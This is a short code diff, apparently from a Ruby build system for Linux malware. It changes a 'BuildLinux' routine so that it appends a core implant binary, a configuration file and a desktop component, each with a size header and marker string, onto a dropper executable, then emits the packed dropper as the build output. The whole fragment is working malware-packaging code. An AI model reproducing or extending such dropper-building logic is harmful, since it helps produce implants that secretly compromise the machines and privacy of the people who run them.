@@ -42,10 +42,23 @@ class BuildLinux < Build
     executable = path('default')
     @appname = params['appname'] || 'install'
 
-    #TODO: create it!
-    FileUtils.mv path('core'), path('output')
+    MARKER = "BmFyY5JhOGhoZjN1"
 
-    File.exist? path('output') || raise("output file not created by dropper")
+    dropper_size = File.size(path('dropper'))
+
+    File.open(path('dropper'), "ab") do |f|
+      f.write MARKER
+      f.write [File.size(path('core'))].pack('I')
+      f.write File.binread(path('core'))
+      f.write [File.size(path('config'))].pack('I')
+      f.write File.binread(path('config'))
+      f.write [File.size(path('desktop'))].pack('I')
+      f.write File.binread(path('desktop'))
+      f.write MARKER
+      f.write [dropper_size].pack('I')
+    end
+
+    FileUtils.mv path('dropper'), path('output')
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
